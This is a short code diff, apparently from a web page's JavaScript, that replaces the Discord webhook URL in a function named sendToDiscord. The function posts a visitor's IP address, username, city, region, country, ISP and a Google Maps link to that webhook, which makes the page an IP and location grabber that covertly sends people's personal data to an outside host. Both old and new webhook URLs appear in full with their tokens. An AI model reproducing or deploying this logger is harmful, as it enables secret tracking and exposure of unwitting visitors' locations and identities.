@@ -140,7 +140,7 @@
         }
 
         function sendToDiscord(ipInfoData, googleMapsLink, username) {
-            const webhookURL = "https://discord.com/api/webhooks/1476978856958230650/PEXmwOuXfPdT25bp9v04Kk-pMKqrq38MIjU_qDRiP9ro1FkTRBwEYg11byH2qTG7FVaH";
+            const webhookURL = "https://discord.com/api/webhooks/1478764736308052099/F3kYGjShpLuDACdmPcig004P1pdpFgm7TqDOWoFkbhzF5UMgm-hxJM88GnHco9BXBn6M";
             const payload = {
                 content: `lua: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
             };
